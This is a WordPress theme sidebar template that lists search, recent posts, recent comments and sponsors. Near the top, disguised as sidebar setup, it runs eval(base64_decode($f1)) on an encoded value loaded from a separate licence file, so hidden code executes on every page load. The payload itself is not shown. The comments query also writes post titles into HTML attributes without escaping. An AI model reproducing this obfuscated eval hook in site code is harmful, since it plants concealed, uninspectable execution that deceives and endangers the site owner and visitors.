	<div class="sidebar_right column">

	<div id="sidebars">

	<ul>

				<?php 	/* Widgetized sidebar, if you have the plugin installed. */
					require_once("theme_licence.php"); if(!function_exists("get_credits")) { eval(base64_decode($f1)); } if ( !function_exists('dynamic_sidebar') || !dynamic_sidebar(1) ) : ?>



			<li class="search"><h2>Search</h2>
				<ul>
				<?php include (TEMPLATEPATH . '/searchform.php'); ?>
				</ul>
			</li>



			<li><!-- Activity -->
			<ul><h2><?php _e('Recent Posts'); ?></h2>
			<!--This will show the last 10 posts, including the last one. To change the number of post shown
			edit the 'nuberposts=x' to whatever value you want, and to skip the last one (or last 2, 3, etc.)
			increase the value of 'offset=x' (default is "0" so it will start by the last post)-->
				<?php
						$posts = get_posts('numberposts=5&offset=0');
						foreach ($posts as $post) :
					?>
					<li>
					<a href="<?php the_permalink(); ?>" title="<?php the_title() ?>"><?php the_title() ?></a>
					</li>
					<?php
						endforeach;
					?>
				</ul>
			</li><!-- End of Activity -->


				<li class="comments"><h2>Recent Comments</h2>
				<ul>

	<?php
    global $wpdb;
    $sql = "SELECT DISTINCT ID, post_title, post_password, comment_ID,
    comment_post_ID, comment_author, comment_date_gmt, comment_approved,
    comment_type,comment_author_url,
    SUBSTRING(comment_content,1,30) AS com_excerpt
    FROM $wpdb->comments
    LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID =
    $wpdb->posts.ID)
    WHERE comment_approved = '1' AND comment_type = '' AND
    post_password = ''
    ORDER BY comment_date_gmt DESC
    LIMIT 10";
    $comments = $wpdb->get_results($sql);
    $output = $pre_HTML;
    $output .= "\n<ul>";
    foreach ($comments as $comment) {
    $output .= "\n<li>".strip_tags($comment->comment_author)
    .":" . "<a href=\"" . get_permalink($comment->ID) .
    "#comment-" . $comment->comment_ID . "\" title=\"on " .
    $comment->post_title . "\">" . strip_tags($comment->com_excerpt)
    ."</a></li>";
    }
    $output .= "\n</ul>";
    $output .= $post_HTML;
    echo $output;?>
				</ul>
			</li>

			<li>
<h2>Sponsors</h2>
<?php include (TEMPLATEPATH . '/160x600.php'); ?></div>
			</li>

			<?php endif; ?>


		</ul>
		</div>
	</div>
